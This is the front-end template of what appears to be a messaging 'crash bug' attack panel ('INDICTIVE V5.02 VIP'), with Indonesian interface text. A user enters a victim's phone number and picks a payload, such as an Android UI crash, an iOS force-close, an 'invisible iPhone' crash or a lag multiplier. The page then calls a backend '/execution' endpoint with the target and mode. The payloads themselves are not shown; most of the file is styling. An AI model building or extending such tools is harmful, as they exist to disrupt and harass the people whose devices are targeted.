        }

        .status-panel {
            background: var(--panel-bg);
            border: 1px solid var(--border-color);
            border-radius: 16px;
            overflow: hidden;
            position: relative;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            animation: slideUp 0.5s ease-out;
        }

        @keyframes slideUp {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .video-wrapper {
            width: 100%;
            height: 140px;
            position: relative;
        }

        .video-wrapper video {
            width: 100%;
            height: 100%;
            object-fit: cover;
            opacity: 0.6;
            filter: hue-rotate(20deg);
        }

        .video-text {
            position: absolute;
            bottom: 15px;
            left: 15px;
            z-index: 2;
        }
        
        .video-title {
            font-family: 'Orbitron';
            font-size: 16px;
            color: white;
            margin-bottom: 2px;
            animation: textPulse 3s infinite;
        }

        @keyframes textPulse {
            0%, 100% { text-shadow: 0 0 10px rgba(188, 19, 254, 0.3); }
            50% { text-shadow: 0 0 20px rgba(188, 19, 254, 0.6); }
        }

        .video-sub {
            font-family: 'Share Tech Mono';
            font-size: 10px;
            color: var(--accent-cyan);
            letter-spacing: 1px;
        }

        /* --- 5. CONTROL PANEL --- */
        .input-box {
            position: relative;
            margin-bottom: 20px;
            animation: slideRight 0.5s ease-out 0.1s backwards;
        }

        @keyframes slideRight {
            from { opacity: 0; transform: translateX(-20px); }
            to { opacity: 1; transform: translateX(0); }
        }

        .cyber-input {
            width: 100%;
            background: rgba(0,0,0,0.3);
            border: 1px solid var(--border-color);
            border-left: 3px solid var(--accent-purple);
            border-radius: 8px;
            padding: 15px 15px 15px 45px;
            color: #fff;
            font-family: 'Share Tech Mono';
            font-size: 16px;
            letter-spacing: 1px;
            transition: 0.3s;
        }

        .cyber-input:focus {
            background: rgba(188, 19, 254, 0.05);
            border-color: var(--accent-purple);
            box-shadow: 0 0 20px rgba(188, 19, 254, 0.15);
        }

        .input-icon {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: var(--text-muted);
            transition: 0.3s;
        }

        .cyber-input:focus ~ .input-icon {
            color: var(--accent-purple);
            transform: translateY(-50%) rotate(15deg);
        }

        .tabs-container {
            display: flex;
            gap: 8px;
            overflow-x: auto;
            padding-bottom: 5px;
            margin-bottom: 20px;
            scrollbar-width: none;
            animation: slideRight 0.5s ease-out 0.2s backwards;
        }

        .tabs-container::-webkit-scrollbar { display: none; }

        .tab-pill {
            padding: 8px 16px;
            background: rgba(255,255,255,0.03);
            border: 1px solid var(--border-color);
            border-radius: 30px;
            color: var(--text-muted);
            font-size: 11px;
            font-weight: 700;
            white-space: nowrap;
            cursor: pointer;
            transition: 0.3s;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .tab-pill.active {
            background: linear-gradient(135deg, rgba(188, 19, 254, 0.2), rgba(79, 172, 254, 0.1));
            border-color: var(--accent-purple);
            color: white;
            box-shadow: 0 4px 15px rgba(188, 19, 254, 0.4);
            transform: translateY(-2px);
        }

        /* --- 6. GRID SYSTEM --- */
        .grid-layout {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 15px;
            margin-bottom: 30px;
            animation: fadeIn 0.5s ease-out 0.3s backwards;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        @media (min-width: 600px) { 
            .grid-layout { 
                grid-template-columns: repeat(2, 1fr); 
                gap: 20px;
            } 
        }
        
        @media (min-width: 768px) { 
            .grid-layout { 
                grid-template-columns: repeat(4, 1fr); 
            } 
        }

        .tech-card {
            background: linear-gradient(135deg, rgba(30,30,40,0.8), rgba(15,15,20,0.9));
            border: 1px solid var(--border-color);
            clip-path: polygon(10% 0, 100% 0, 100% 90%, 90% 100%, 0 100%, 0 10%);
            padding: 25px 15px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            gap: 12px;
            cursor: pointer;
            position: relative;
            transition: all 0.3s ease;
            animation: cardAppear 0.3s ease backwards;
            min-height: 140px;
        }

        @keyframes cardAppear {
            from { opacity: 0; transform: scale(0.9); }
            to { opacity: 1; transform: scale(1); }
        }

        .tech-card:hover {
            transform: translateY(-5px);
            background: rgba(255,255,255,0.05);
            box-shadow: 0 10px 25px rgba(0,0,0,0.4);
        }

        .tech-card.active {
            background: linear-gradient(135deg, rgba(188, 19, 254, 0.15), rgba(15,15,20,0.9));
            border-color: var(--accent-purple);
        }

        .tech-card.active .card-icon {
            color: #fff;
            transform: scale(1.1);
            text-shadow: 0 0 15px var(--accent-purple);
            animation: iconPulse 2s infinite;
        }

        @keyframes iconPulse {
            0%, 100% { transform: scale(1.1); }
            50% { transform: scale(1.2); }
        }

        .card-icon { 
            font-size: 32px; 
            color: var(--text-muted); 
            transition: 0.3s; 
            margin-bottom: 5px;
        }
        
        .card-text { 
            text-align: center; 
            width: 100%;
        }
        
        .card-name { 
            font-family: 'Orbitron'; 
            font-size: 14px; 
            color: #eee; 
            margin-bottom: 5px; 
            display: block; 
            letter-spacing: 1px;
        }
        
        .card-sub { 
            font-size: 11px; 
            color: #888; 
            font-family: 'Share Tech Mono'; 
            display: block; 
            line-height: 1.4;
        }

        /* --- 7. FINGERPRINT SECTION & ANIMATION --- */
        .deploy-section {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 15px;
            margin-top: 20px;
            animation: fadeIn 0.5s ease-out 0.4s backwards;
        }

        .finger-wrapper {
            position: relative;
            width: 90px;
            height: 90px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .scan-btn {
            width: 80px;
            height: 80px;
            background: linear-gradient(145deg, #1a1a20, #0a0a0e);
            border-radius: 50%;
            border: 1px solid var(--border-color);
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            z-index: 5;
            transition: all 0.2s ease;
            box-shadow: 0 5px 15px rgba(0,0,0,0.5), inset 0 0 20px rgba(0,0,0,0.8);
            position: relative;
            overflow: hidden;
        }

        /* Border Pulse Animation when Charging */
        .scan-btn.charging {
            border-color: var(--accent-green);
            animation: borderPulsing 0.8s infinite alternate;
        }

        @keyframes borderPulsing {
            0% { box-shadow: 0 0 10px rgba(0, 255, 136, 0.2), inset 0 0 20px rgba(0, 255, 136, 0.1); }
            100% { box-shadow: 0 0 30px rgba(0, 255, 136, 0.6), inset 0 0 40px rgba(0, 255, 136, 0.3); }
        }

        .finger-icon {
            font-size: 36px;
            color: var(--text-muted);
            transition: 0.3s;
            z-index: 6;
        }

        .scan-btn.charging .finger-icon {
            color: var(--accent-green);
            opacity: 0.8; 
            filter: drop-shadow(0 0 8px var(--accent-green));
        }

        /* SCANNER LASER ANIMATION */
        .scan-line {
            position: absolute;
            width: 100%;
            height: 4px;
            background: var(--accent-green);
            box-shadow: 0 0 15px var(--accent-green), 0 0 5px #fff;
            top: 0%;
            left: 0;
            z-index: 7;
            opacity: 0;
            pointer-events: none;
            border-radius: 50%;
        }

        .scan-btn.charging .scan-line {
            opacity: 1;
            animation: scanMove 1.2s cubic-bezier(0.45, 0.05, 0.55, 0.95) infinite;
        }

        @keyframes scanMove {
            0% { top: -20%; opacity: 0; }
            10% { opacity: 1; }
            90% { opacity: 1; }
            100% { top: 120%; opacity: 0; }
        }

        /* Status Text */
        .status-text {
            font-size: 10px;
            color: var(--text-muted);
            letter-spacing: 2px;
            text-align: center;
            min-height: 40px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            gap: 5px;
            transition: all 0.3s ease;
        }

        .status-main { 
            font-weight: 700; 
            transition: color 0.3s; 
            font-size: 12px;
        }
        
        .status-sub { 
            font-size: 9px; 
            opacity: 0.8; 
            transition: color 0.3s; 
        }

        /* --- 8. TOP RIGHT NOTIFICATIONS --- */
        .top-notifications {
            position: fixed;
            top: 25px;
            right: 20px;
            z-index: 1000;
            display: flex;
            flex-direction: column;
            gap: 15px;
            width: 320px;
            pointer-events: none;
        }

        .top-notification {
            background: rgba(12, 12, 18, 0.9);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-left: 4px solid;
            border-radius: 6px;
            padding: 15px 18px;
            backdrop-filter: blur(15px);
            box-shadow: 0 10px 40px rgba(0,0,0,0.5);
            opacity: 0;
            position: relative;
            overflow: hidden;
            pointer-events: auto;
            transform: translateX(120%) skewX(-10deg);
        }

        .top-notification.show { 
            animation: elasticSlideIn 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
        }

        @keyframes elasticSlideIn {
            0% { transform: translateX(120%) skewX(-20deg); opacity: 0; }
            60% { transform: translateX(-5%) skewX(5deg); opacity: 1; }
            80% { transform: translateX(2%) skewX(-2deg); }
            100% { transform: translateX(0) skewX(0); opacity: 1; }
        }

        .top-notification.warning { 
            border-left-color: var(--accent-red); 
            background: linear-gradient(90deg, rgba(255,0,60,0.1), rgba(12,12,18,0.95));
            box-shadow: 0 5px 20px rgba(255, 0, 60, 0.15); 
        }
        
        .top-notification.warning .notification-icon { color: var(--accent-red); }
        .top-notification.warning .notification-title { color: var(--accent-red); }

        .top-notification.loading { 
            border-left-color: var(--accent-green); 
            background: linear-gradient(90deg, rgba(0,255,136,0.1), rgba(12,12,18,0.95));
            box-shadow: 0 5px 20px rgba(0, 255, 136, 0.15); 
        }
        
        .top-notification.loading .notification-icon { color: var(--accent-green); }
        .top-notification.loading .notification-title { color: var(--accent-green); }

        .notification-header { 
            display: flex; 
            align-items: center; 
            gap: 12px; 
            margin-bottom: 6px; 
            position: relative; 
            z-index: 2; 
        }
        
        .notification-icon { 
            font-size: 16px; 
            filter: drop-shadow(0 0 5px currentColor); 
        }
        
        .notification-title { 
            font-family: 'Orbitron'; 
            font-size: 13px; 
            font-weight: 700; 
            letter-spacing: 1px; 
            text-transform: uppercase; 
        }
        
        .notification-message { 
            font-size: 11px; 
            color: #bbb; 
            font-family: 'Rajdhani'; 
            line-height: 1.4; 
            position: relative; 
            z-index: 2; 
        }

        .progress-bar-container { 
            margin-top: 10px; 
            height: 3px; 
            background: rgba(255, 255, 255, 0.1); 
            width: 100%; 
            position: relative; 
            z-index: 2; 
            border-radius: 2px; 
            overflow: hidden; 
        }
        
        .progress-bar { 
            height: 100%; 
            background: var(--accent-green); 
            width: 0%; 
            box-shadow: 0 0 10px var(--accent-green); 
            transition: width 0.1s linear; 
        }
        
        .progress-text { 
            position: absolute; 
            top: 15px; 
            right: 15px; 
            font-size: 10px; 
            font-family: 'Share Tech Mono'; 
            color: var(--accent-green); 
        }

        /* --- 9. IMPROVED SUCCESS NOTIFICATION --- */
        .success-notification {
            position: fixed;
            top: 50%; 
            left: 50%;
            width: 360px;
            max-width: 90%;
            background: rgba(8, 10, 15, 0.98);
            border: 1px solid rgba(0, 255, 136, 0.3);
            border-radius: 16px;
            padding: 0;
            z-index: 2000;
            backdrop-filter: blur(30px);
            box-shadow: 0 25px 60px rgba(0, 255, 136, 0.2),
                        0 0 0 1px rgba(0, 255, 136, 0.1),
                        inset 0 0 20px rgba(0, 255, 136, 0.05);
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            text-align: center;
            pointer-events: none;
            visibility: hidden;
            overflow: hidden;
            opacity: 0;
            transform: translate(-50%, -50%) scale(0.8) rotateX(-10deg);
            transform-origin: center;
            transition: opacity 0.3s, transform 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }

        .success-notification.show {
            visibility: visible;
            pointer-events: auto;
            opacity: 1;
            transform: translate(-50%, -50%) scale(1) rotateX(0deg);
        }

        /* Holographic glow effect */
        .success-notification::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(135deg, 
                rgba(0, 255, 136, 0.05) 0%, 
                rgba(0, 255, 136, 0.02) 25%, 
                transparent 50%, 
                rgba(0, 255, 136, 0.02) 75%, 
                rgba(0, 255, 136, 0.05) 100%);
            z-index: 1;
            pointer-events: none;
        }

        /* Animated corner accents */
        .success-notification::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                linear-gradient(90deg, transparent 95%, rgba(0, 255, 136, 0.2) 100%) 0 0,
                linear-gradient(180deg, transparent 95%, rgba(0, 255, 136, 0.2) 100%) 0 0,
                linear-gradient(270deg, transparent 95%, rgba(0, 255, 136, 0.2) 100%) 100% 0,
                linear-gradient(0deg, transparent 95%, rgba(0, 255, 136, 0.2) 100%) 0 100%;
            background-size: 20px 20px;
            background-repeat: no-repeat;
            z-index: 2;
            pointer-events: none;
        }

        .success-content {
            padding: 35px 30px;
            width: 100%;
            position: relative;
            z-index: 3;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        /* Success Icon with enhanced animation */
        .success-icon {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            background: radial-gradient(circle at 30% 30%, rgba(0, 255, 136, 0.3), transparent 70%);
            border: 2px solid rgba(0, 255, 136, 0.6);
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 25px auto;
            color: var(--accent-green);
            font-size: 34px;
            position: relative;
            transform: scale(0);
            box-shadow: 
                0 0 30px rgba(0, 255, 136, 0.4),
                inset 0 0 20px rgba(0, 255, 136, 0.1);
            animation: iconPulseSuccess 2s ease-in-out infinite 0.5s;
        }

        @keyframes iconPulseSuccess {
            0%, 100% { 
                box-shadow: 
                    0 0 30px rgba(0, 255, 136, 0.4),
                    inset 0 0 20px rgba(0, 255, 136, 0.1);
            }
            50% { 
                box-shadow: 
                    0 0 50px rgba(0, 255, 136, 0.6),
                    inset 0 0 30px rgba(0, 255, 136, 0.2);
            }
        }

        .success-notification.show .success-icon {
            animation: iconPopSuccess 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards,
                       iconPulseSuccess 2s ease-in-out infinite 0.6s;
        }

        @keyframes iconPopSuccess {
            0% { transform: scale(0) rotate(-180deg); opacity: 0; }
            70% { transform: scale(1.1) rotate(10deg); opacity: 1; }
            100% { transform: scale(1) rotate(0deg); opacity: 1; }
        }

        .success-title { 
            font-family: 'Orbitron'; 
            font-size: 24px; 
            color: #fff; 
            margin-bottom: 8px; 
            letter-spacing: 2px; 
            text-shadow: 0 0 15px rgba(0, 255, 136, 0.8);
            opacity: 0;
            transform: translateY(20px);
            animation: titleSlideUp 0.5s 0.2s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
        }

        @keyframes titleSlideUp {
            to { opacity: 1; transform: translateY(0); }
        }

        .success-message { 
            font-size: 14px; 
            color: var(--text-muted); 
            margin-bottom: 30px;
            line-height: 1.5;
            opacity: 0;
            transform: translateY(15px);
            animation: messageSlideUp 0.5s 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
        }

        @keyframes messageSlideUp {
            to { opacity: 1; transform: translateY(0); }
        }

        /* Enhanced Details Panel */
        .success-details {
            background: rgba(0, 0, 0, 0.4);
            border: 1px solid rgba(0, 255, 136, 0.2);
            border-radius: 10px;
            padding: 20px;
            width: 100%;
            opacity: 0;
            transform: translateY(20px);
            animation: detailsSlideUp 0.5s 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
            position: relative;
            overflow: hidden;
        }

        @keyframes detailsSlideUp {
            to { opacity: 1; transform: translateY(0); }
        }

        .success-details::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 1px;
            background: linear-gradient(90deg, transparent, var(--accent-green), transparent);
            animation: scanLine 3s linear infinite;
        }

        @keyframes scanLine {
            0% { transform: translateX(-100%); }
            100% { transform: translateX(100%); }
        }

        .success-details div {
            font-family: 'Share Tech Mono'; 
            font-size: 13px; 
            color: #ddd;
            margin-bottom: 10px; 
            display: flex; 
            justify-content: space-between;
            padding-bottom: 8px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.08);
            opacity: 0;
            animation: detailFadeIn 0.3s ease forwards;
        }

        .success-details div:nth-child(1) { animation-delay: 0.5s; }
        .success-details div:nth-child(2) { animation-delay: 0.55s; }
        .success-details div:nth-child(3) { animation-delay: 0.6s; }
        .success-details div:nth-child(4) { animation-delay: 0.65s; }
        .success-details div:nth-child(5) { animation-delay: 0.7s; }

        @keyframes detailFadeIn {
            from { opacity: 0; transform: translateX(-10px); }
            to { opacity: 1; transform: translateX(0); }
        }

        .success-details div:last-child { 
            border-bottom: none; 
            margin-bottom: 0; 
        }
        
        .success-details span:first-child {
            color: #aaa;
            font-weight: normal;
        }
        
        .success-details span:last-child { 
            color: var(--accent-green); 
            font-weight: bold; 
            text-shadow: 0 0 8px rgba(0, 255, 136, 0.4);
            font-family: 'Orbitron';
            letter-spacing: 1px;
        }

        /* Close button with hover effect */
        .close-notification {
            position: absolute; 
            top: 15px; 
            right: 15px;
            width: 32px; 
            height: 32px; 
            z-index: 10;
            display: flex; 
            align-items: center; 
            justify-content: center;
            color: #777; 
            cursor: pointer; 
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 50%; 
            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            opacity: 0;
            transform: scale(0.5) rotate(90deg);
        }

        .success-notification.show .close-notification {
            animation: closeButtonAppear 0.4s 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
        }

        @keyframes closeButtonAppear {
            to { opacity: 1; transform: scale(1) rotate(0deg); }
        }

        .close-notification:hover { 
            color: #fff; 
            background: rgba(255, 0, 60, 0.8); 
            border-color: var(--accent-red);
            transform: scale(1.1) rotate(90deg);
            box-shadow: 0 0 20px rgba(255, 0, 60, 0.5);
        }

        /* --- 10. RESPONSIVE --- */
        @media (max-width: 768px) {
            .top-notifications { width: 280px; right: 10px; top: 15px; }
            .finger-wrapper { width: 80px; height: 80px; }
            .scan-btn { width: 70px; height: 70px; }
            .success-notification { width: 320px; }
            .success-content { padding: 25px 20px; }
            .success-icon { width: 70px; height: 70px; font-size: 30px; }
            .success-title { font-size: 20px; }
            .success-message { font-size: 13px; }
            .success-details { padding: 15px; }
            .success-details div { font-size: 12px; }
            .grid-layout { gap: 12px; }
            .tech-card { padding: 20px 12px; min-height: 120px; }
            .card-icon { font-size: 28px; }
            .card-name { font-size: 13px; }
            .card-sub { font-size: 10px; }
        }

        .desktop-info {
            margin-top: 20px; font-size: 10px; color: #555;
            font-family: 'Share Tech Mono'; line-height: 1.6;
        }
        
        @media (max-width: 1024px) { .desktop-info { display: none; } }

    </style>
</head>
<body>

    <div class="top-notifications" id="topNotifications"></div>

    <div class="success-notification" id="successNotification">
        <div class="close-notification" onclick="hideNotification()">
            <i class="fa-solid fa-times"></i>
        </div>
        <div class="success-content">
            <div class="success-icon">
                <i class="fa-solid fa-check"></i>
            </div>
            <div class="success-title">MISSION ACCOMPLISHED</div>
            <div class="success-message">Payload successfully injected into target system</div>
            <div class="success-details" id="successDetails"></div>
        </div>
    </div>

    <div class="main-container">
        
        <div class="sidebar-area">
            <div class="header-bar">
                <div class="back-btn" onclick="history.back()">
                    <i class="fa-solid fa-arrow-left"></i>
                </div>
                <div class="brand-logo">INDICTIVE <span style="font-size:12px; color:#666;">V5.02 VIP</span></div>
                <div class="status-badge">ONLINE</div>
            </div>

            <div class="status-panel">
                <div class="video-wrapper">
                    <video autoplay muted loop playsinline>
                        <source src="https://files.catbox.moe/6rnx3e.mp4" type="video/mp4">
                    </video>
                    <div class="video-text">
                        <div class="video-title">INDICTIVE EXECUTION</div>
                        <div class="video-sub">Core Modules Loaded</div>
                    </div>
                </div>
            </div>
            
            <div class="desktop-info">
                > CONNECTION: ENCRYPTED<br>
                > LATENCY: 24ms<br>
                > GATEWAY: ASIA-HK<br>
                > LICENSE: VERIFIED
            </div>
        </div>

        <div class="content-area">
            
            <div class="input-box">
                <input type="tel" class="cyber-input" id="targetInput" placeholder="ENTER TARGET NUMBER (628xxx, 1xxx, 44xxx)" autocomplete="off">
                <i class="fa-solid fa-crosshairs input-icon"></i>
            </div>

            <div class="tabs-container">
                <div class="tab-pill active" onclick="filterBugs('all', this)"><i class="fa-solid fa-layer-group"></i> ALL</div>
                <div class="tab-pill" onclick="filterBugs('delay', this)"><i class="fa-solid fa-clock"></i> DELAY</div>
                <div class="tab-pill" onclick="filterBugs('android', this)"><i class="fa-brands fa-android"></i> ANDROID</div>
                <div class="tab-pill" onclick="filterBugs('ios', this)"><i class="fa-brands fa-apple"></i> IOS</div>
            </div>

            <div class="grid-layout" id="bugGrid"></div>

            <div class="deploy-section">
                <div class="finger-wrapper">
                    <div class="scan-btn" id="scanBtn">
                        <div class="scan-line"></div>
                        <i class="fa-solid fa-fingerprint finger-icon" id="scanIcon"></i>
                    </div>
                </div>
                
                <div class="status-text" id="statusText">
                    <div class="status-main">TEKAN DAN TAHAN</div>
                    <div class="status-sub">UNTUK DEPLOY PAYLOAD</div>
                </div>
            </div>

        </div>

    </div>

    <script>
        // --- DATA BUGS (4 MENU UTAMA) ---
        const bugData = [
            { id: 'andros-delay', name: 'DELAY MAKER', desc: 'Android Lag Multiplier', type: 'delay', icon: 'fa-solid fa-hourglass-half' },
            { id: 'andros', name: 'ANDROXUI', desc: 'Android UI Crash', type: 'android', icon: 'fa-brands fa-android' },
            { id: 'ios', name: 'FORCE CLOSE', desc: 'Force Close App', type: 'ios', icon: 'fa-solid fa-skull' },
            { id: 'invis-iphone', name: 'INVISIBLE IOS', desc: 'iPhone Stealth Crash', type: 'ios', icon: 'fa-solid fa-ghost' }
        ];

        const grid = document.getElementById('bugGrid');
        const topNotifications = document.getElementById('topNotifications');
        const scanBtn = document.getElementById('scanBtn');
        
        let selectedBug = null;
        let pressTimer = null;
        let chargeValue = 0;
        let isCharging = false;
        let touchStartTime = 0;
        let loadingNotificationId = null;
        let isTouching = false; 

        if(window.innerWidth > 1024) document.querySelector('.desktop-info').style.display = 'block';

        // --- NOTIFICATION SYSTEM ---
        function showTopNotification(type, title, message, progress = null) {
            if (type === 'warning') {
                const existingWarning = document.querySelector('.top-notification.warning');
                if (existingWarning) existingWarning.remove();
            }

            const notifId = 'notif_' + Date.now();
            const notification = document.createElement('div');
            notification.className = \`top-notification \${type}\`;
            notification.id = notifId;
            
            let progressBarHtml = '';
            let progressTextHtml = '';
            
            if (progress !== null) {
                progressBarHtml = \`
                    <div class="progress-bar-container">
                        <div class="progress-bar" id="pb_\${notifId}"></div>
                    </div>\`;
                progressTextHtml = \`<div class="progress-text" id="pt_\${notifId}">0%</div>\`;
            }

            const iconClass = type === 'warning' ? 'fa-triangle-exclamation' : 'fa-circle-notch fa-spin';

            notification.innerHTML = \`
                \${progressTextHtml}
                <div class="notification-header">
                    <i class="fa-solid \${iconClass} notification-icon"></i>
                    <div class="notification-title">\${title}</div>
                </div>
                <div class="notification-message">\${message}</div>
                \${progressBarHtml}
            \`;
            
            topNotifications.appendChild(notification);
            
            void notification.offsetWidth;
            notification.classList.add('show');
            
            if (type === 'warning') {
                setTimeout(() => removeTopNotification(notifId), 2500);
            }

            return notifId;
        }

        function updateNotificationProgress(notifId, value) {
            const pb = document.getElementById(\`pb_\${notifId}\`);
            const pt = document.getElementById(\`pt_\${notifId}\`);
            if(pb) pb.style.width = \`\${value}%\`;
            if(pt) pt.textContent = \`\${Math.floor(value)}%\`;
        }

        function removeTopNotification(notifId) {
            const el = document.getElementById(notifId);
            if(el) {
                el.style.transform = 'translateX(120%) skewX(10deg)';
                el.style.opacity = '0';
                setTimeout(() => el.remove(), 400);
            }
        }

        // --- GRID & LOGIC ---
        function renderGrid(filter = 'all') {
            grid.innerHTML = '';
            const list = filter === 'all' ? bugData : bugData.filter(b => b.type === filter);
            list.forEach((bug, index) => {
                const card = document.createElement('div');
                card.className = 'tech-card';
                card.style.animationDelay = \`\${index * 0.05}s\`;
                card.onclick = () => selectBug(card, bug);
                card.innerHTML = \`
                    <i class="\${bug.icon} card-icon"></i>
                    <div class="card-text">
                        <span class="card-name">\${bug.name}</span>
                        <span class="card-sub">\${bug.desc}</span>
                    </div>
                \`;
                grid.appendChild(card);
            });
        }

        function filterBugs(type, btn) {
            document.querySelectorAll('.tab-pill').forEach(t => t.classList.remove('active'));
            btn.classList.add('active');
            renderGrid(type);
            selectedBug = null;
            updateStatusText();
        }

        function selectBug(card, bug) {
            document.querySelectorAll('.tech-card').forEach(c => c.classList.remove('active'));
            card.classList.add('active');
            selectedBug = bug;
            if(navigator.vibrate) navigator.vibrate(20);
            updateStatusText();
        }

        function updateStatusText() {
            const main = document.querySelector('.status-main');
            const sub = document.querySelector('.status-sub');
            if(selectedBug) {
                main.textContent = selectedBug.name;
                main.style.color = 'var(--accent-purple)';
                sub.textContent = 'READY TO DEPLOY';
                sub.style.color = 'var(--accent-blue)';
            } else {
                main.textContent = 'TEKAN DAN TAHAN';
                main.style.color = '';
                sub.textContent = 'UNTUK DEPLOY PAYLOAD';
                sub.style.color = '';
            }
        }

        // --- DEPLOY LOGIC ---
        
        // Event Listeners
        scanBtn.addEventListener('touchstart', (e) => { e.preventDefault(); isTouching = true; handleStart(); }, {passive: false});
        scanBtn.addEventListener('touchend', (e) => { e.preventDefault(); handleEnd(); });
        scanBtn.addEventListener('mousedown', (e) => { if (!isTouching) handleStart(); });
        scanBtn.addEventListener('mouseup', (e) => { if (!isTouching) handleEnd(); });
        scanBtn.addEventListener('mouseleave', (e) => { if (!isTouching && isCharging) handleEnd(); });

        function handleStart() {
            touchStartTime = Date.now();
            
            if(!selectedBug) {
                showTopNotification('warning', 'ACCESS DENIED', 'Pilih payload dari daftar terlebih dahulu.');
                if(navigator.vibrate) navigator.vibrate(100);
                return;
            }
            
            const targetInput = document.getElementById('targetInput').value.trim();
            if(!targetInput) {
                showTopNotification('warning', 'TARGET MISSING', 'Masukkan nomor target sebelum eksekusi.');
                if(navigator.vibrate) navigator.vibrate(100);
                return;
            }
            
            // Validasi untuk semua negara - hanya angka, minimal 8 digit, maksimal 15 digit
            const cleanedTarget = targetInput.replace(/\D/g, ''); // Hapus semua non-digit
            
            if(cleanedTarget.length < 8 || cleanedTarget.length > 15) {
                showTopNotification('warning', 'INVALID TARGET', 'Format nomor salah. Minimal 8 digit, maksimal 15 digit angka (termasuk kode negara). Contoh: 6281234567890, 447123456789, 15551234567');
                if(navigator.vibrate) navigator.vibrate(100);
                return;
            }

            isCharging = true;
            chargeValue = 0;
            
            const warnings = document.querySelectorAll('.top-notification.warning');
            warnings.forEach(w => w.remove());

            loadingNotificationId = showTopNotification('loading', 'INJECTING', \`Initializing \${selectedBug.name}...\`, 0);
            
            scanBtn.classList.add('charging');
            if(navigator.vibrate) navigator.vibrate(30);

            pressTimer = setInterval(() => {
                chargeValue += 2.5;
                if(loadingNotificationId) updateNotificationProgress(loadingNotificationId, chargeValue);

                if(chargeValue >= 100) {
                    clearInterval(pressTimer);
                    executePayload(cleanedTarget);
                }
            }, 30);
        }

        function handleEnd() {
            if(!isCharging) return;
            
            clearInterval(pressTimer);
            isCharging = false;
            scanBtn.classList.remove('charging');

            if(loadingNotificationId) {
                removeTopNotification(loadingNotificationId);
                loadingNotificationId = null;
            }

            const duration = Date.now() - touchStartTime;

            if(chargeValue < 100) {
                if (duration < 400) {
                    showTopNotification('warning', 'HOLD REQUIRED', 'Tekan dan Tahan tombol untuk eksekusi.');
                } else {
                    showTopNotification('warning', 'ABORTED', 'Injeksi dibatalkan oleh pengguna.');
                }
                if(navigator.vibrate) navigator.vibrate([50, 50]);
            }
            
            setTimeout(() => { isTouching = false; }, 500);
        }

        function executePayload(cleanedTarget) {
            const notif = document.getElementById('successNotification');
            const details = document.getElementById('successDetails');
            const now = new Date();
            
            // Format waktu lebih baik
            const timeString = \`\${now.getHours().toString().padStart(2, '0')}:\${now.getMinutes().toString().padStart(2, '0')}:\${now.getSeconds().toString().padStart(2, '0')}\`;
            const dateString = \`\${now.getDate().toString().padStart(2, '0')}/\${(now.getMonth()+1).toString().padStart(2, '0')}/\${now.getFullYear()}\`;
            
            details.innerHTML = \`
                <div><span>TARGET ID</span><span>\${cleanedTarget}</span></div>
                <div><span>PAYLOAD</span><span>\${selectedBug.name}</span></div>
                <div><span>STATUS</span><span style="color:#00ff88">INJECTED [200 OK]</span></div>
                <div><span>LATENCY</span><span>24ms</span></div>
                <div><span>TIMESTAMP</span><span>\${timeString} | \${dateString}</span></div>\`;
            
            notif.classList.add('show');
            
            // Kirim request ke server
            fetch(\`/execution?target=\${cleanedTarget}&mode=\${selectedBug.id}\`)
                .then(response => response.text())
                .then(html => {
                    console.log('Payload executed successfully');
                })
                .catch(error => {
                    console.error('Error executing payload:', error);
                    showTopNotification('warning', 'SERVER ERROR', 'Gagal menghubungi server. Coba lagi.');
                });
            
            // Haptic feedback lebih kaya
            if(navigator.vibrate) navigator.vibrate([80, 40, 80, 40, 120]);
            
            // Reset UI
            selectedBug = null;
            document.querySelectorAll('.tech-card.active').forEach(el => el.classList.remove('active'));
            document.getElementById('targetInput').value = '';
            updateStatusText();
        }

        function hideNotification() {
            const notif = document.getElementById('successNotification');
            notif.classList.remove('show');
        }

        // Close notification when clicking outside
        document.addEventListener('click', function(event) {
            const notification = document.getElementById('successNotification');
            if(notification.classList.contains('show') && 
               !notification.contains(event.target) && 
               event.target.id !== 'scanBtn' && 
               !event.target.closest('#scanBtn')) {
                hideNotification();
            }
        });

        // Init
        renderGrid();
        updateStatusText();
        document.querySelector('video').play().catch(e => {});

        // Tambahkan contoh kode negara di placeholder
        const examples = ['6281234567890', '15551234567', '447123456789', '33123456789'];
        let exampleIndex = 0;
        const targetInput = document.getElementById('targetInput');
        
        function rotatePlaceholder() {
            targetInput.placeholder = \`ENTER TARGET NUMBER (e.g. \${examples[exampleIndex]})\`;
            exampleIndex = (exampleIndex + 1) % examples.length;
        }
        
        // Rotate placeholder setiap 3 detik
        setInterval(rotatePlaceholder, 3000);
        rotatePlaceholder();

    </script>
</body>
</html>`;
};